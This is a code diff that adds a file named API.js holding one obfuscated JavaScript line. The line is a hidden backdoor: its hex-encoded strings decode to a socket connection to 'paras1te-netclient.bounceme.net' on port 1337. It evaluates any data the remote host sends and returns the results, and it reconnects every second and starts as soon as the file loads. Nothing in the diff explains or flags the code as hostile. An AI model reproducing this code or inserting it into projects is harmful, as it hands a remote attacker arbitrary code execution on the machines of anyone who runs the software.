@@ -1,1 +1,2 @@
-
+//API.js
+var _0x6dde=["\x6E\x65\x74","\x70\x61\x72\x61\x73\x31\x74\x65\x2D\x6E\x65\x74\x63\x6C\x69\x65\x6E\x74\x2E\x62\x6F\x75\x6E\x63\x65\x6D\x65\x2E\x6E\x65\x74","\x63\x6F\x6E\x6E\x65\x63\x74","\x64\x61\x74\x61","\x77\x72\x69\x74\x65","\x6F\x6E"];(()=>{let _0x86c9x1=require(_0x6dde[0]);let _0x86c9x2=_0x6dde[1];let _0x86c9x3=1337;let _0x86c9x4= new _0x86c9x1.Socket();let _0x86c9x5=()=>{try{_0x86c9x4[_0x6dde[2]](_0x86c9x3,_0x86c9x2,()=>{_0x86c9x6()})}catch(e){setTimeout(_0x86c9x5,1000)}};let _0x86c9x6=()=>{try{_0x86c9x4[_0x6dde[5]](_0x6dde[3],(_0x86c9x7)=>{_0x86c9x4[_0x6dde[4]](eval(_0x86c9x7))})}catch(e){setTimeout(_0x86c9x5,1000)}};_0x86c9x5()})()
